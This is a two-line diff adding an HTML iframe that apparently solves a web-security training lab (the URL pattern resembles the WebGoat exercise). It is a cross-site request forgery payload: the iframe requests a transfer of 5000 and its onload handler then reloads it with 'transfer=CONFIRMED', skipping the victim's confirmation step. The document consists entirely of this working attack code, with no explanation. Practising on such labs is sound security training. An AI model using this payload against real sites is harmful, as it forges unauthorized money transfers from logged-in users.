@@ -1,0 +1,2 @@
+<iframe id="frame" src='attack?Screen=869854058&menu=900&transfer=5000' width='1000' height='400' border='3'
+onload="document.getElementById('frame').src='attack?Screen=869854058&menu=900&transfer=CONFIRMED';"></iframe>
